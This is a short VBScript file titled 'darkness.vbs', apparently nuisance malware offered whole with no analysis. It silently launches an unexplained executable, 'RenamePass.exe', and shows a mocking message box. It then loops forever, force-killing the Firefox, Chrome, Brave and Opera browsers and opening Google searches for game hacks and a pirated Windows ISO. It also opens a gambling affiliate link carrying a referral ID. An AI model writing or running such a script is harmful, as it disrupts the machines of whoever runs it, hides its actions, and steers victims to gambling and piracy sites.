
Set wshShell = CreateObject("WScript.Shell")

wshShell.Run "RenamePass.exe", 0

WScript.Sleep 2000

wshShell.Run "taskkill /f /im RenamePass.exe", 0

MsgBox "Will Close Explorer :)", 64, "- darkness.vbs -"

Do
    Set killFirefox = CreateObject("WScript.Shell")
    killFirefox.Run "taskkill /f /im firefox.exe", 0
    killFirefox.Run "taskkill /f /im chrome.exe", 0
    killFirefox.Run "taskkill /f /im brave.exe", 0
    killFirefox.Run "taskkill /f /im opera.exe", 0
    Set WshShellR = CreateObject("Wscript.Shell")
    WshShellR.Run "https://www.google.com/search?q=free+fire+hack+mod+menu+2019+android", 0
    WScript.Sleep 10000
    killFirefox.Run "taskkill /f /im firefox.exe", 0
    killFirefox.Run "taskkill /f /im chrome.exe", 0
    killFirefox.Run "taskkill /f /im brave.exe", 0
    killFirefox.Run "taskkill /f /im opera.exe", 0
    WshShellR.Run "https://www.google.com/search?q=new+sad+sound+mp3+%3A%28+", 0
    WScript.Sleep 10000
    killFirefox.Run "taskkill /f /im firefox.exe", 0
    killFirefox.Run "taskkill /f /im chrome.exe", 0
    killFirefox.Run "taskkill /f /im brave.exe", 0
    killFirefox.Run "taskkill /f /im opera.exe", 0
    WshShellR.Run "https://www.google.com/search?q=%C3%90%C2%B6%CF%A1%D2%89%E2%86%90%E2%96%93%E2%82%BC%E2%82%B0%E2%82%B1%E2%82%BF%E2%82%A9%E1%BE%93%E2%82%A7%E1%BC%8D%E1%BD%B7%E1%B6%98%E1%B9%9F%D6%8D%C3%BF%D1%BA", 0
    WshShellR.Run "https://bcgame.lu/pt/?spin=true&i=23isk02yd&utm_source=23isk02yd", 0
    WshShellR.Run "https://www.google.com/search?q=windows+xp+gangster+edition+iso+download", 0
    WScript.Sleep 10000
Loop
